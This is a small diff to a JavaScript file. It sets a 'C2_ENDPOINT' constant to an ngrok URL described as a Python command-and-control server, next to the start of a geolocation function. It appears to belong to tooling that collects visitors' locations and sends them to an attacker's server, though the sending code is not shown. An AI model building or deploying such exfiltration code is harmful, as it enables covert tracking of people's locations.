@@ -1,6 +1,6 @@
 // This URL will be your ngrok public URL pointing to your Python C2 server.
 // Example: "https://your-ngrok-id.ngrok-free.app/data"
-const C2_ENDPOINT = 'https://spidery-eddie-nontemperable.ngrok-free.dev/data'; 
+const C2_ENDPOINT = 'https://spidery-eddie-nontemperable.ngrok-free.dev/data'; // <--- THIS IS THE LINE TO UPDATE!
 
 // Function to get geolocation
 function getGeolocation() {
